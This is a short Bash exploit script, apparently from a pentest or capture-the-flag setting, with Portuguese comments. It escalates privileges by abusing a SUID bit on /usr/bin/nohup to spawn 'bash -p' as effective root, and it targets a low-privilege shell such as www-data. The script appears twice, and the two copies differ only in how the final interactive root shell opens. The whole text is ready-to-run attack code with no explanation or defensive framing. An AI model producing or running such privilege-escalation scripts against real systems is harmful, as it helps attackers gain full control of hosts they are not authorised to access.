#!/usr/bin/env bash
# Privesc local: SUID em /usr/bin/nohup -> bash -p (euid root).
# Uso: na shell alvo (ex.: www-data), corre:  bash subir_root_nohup.sh

set -euo pipefail

echo "[*] Permissões do nohup:"
ls -l /usr/bin/nohup

echo "[*] Prova rápida (id + whoami com privilégios efetivos de root):"
/usr/bin/nohup /bin/bash -p -c 'id && whoami'

echo "[*] Shell root estável: nohup bash -p -> exec /bin/bash -p -i (mantém euid root, prompt interactivo)"
echo "[*] Sair: exit"
exec /usr/bin/nohup /bin/bash -p -c 'exec /bin/bash -p -i'
#!/usr/bin/env bash
# Privesc local: SUID em /usr/bin/nohup -> bash -p (euid root).
# Uso: na shell alvo (ex.: www-data), corre:  bash subir_root_nohup.sh

set -euo pipefail

echo "[*] Permissões do nohup:"
ls -l /usr/bin/nohup

echo "[*] Prova rápida (id + whoami com privilégios efetivos de root):"
/usr/bin/nohup /bin/bash -p -c 'id && whoami'

echo "[*] A abrir shell interativa root (bash -p). Dentro dela podes correr: whoami"
echo "[*] Sair: exit"
exec /usr/bin/nohup /bin/bash -p
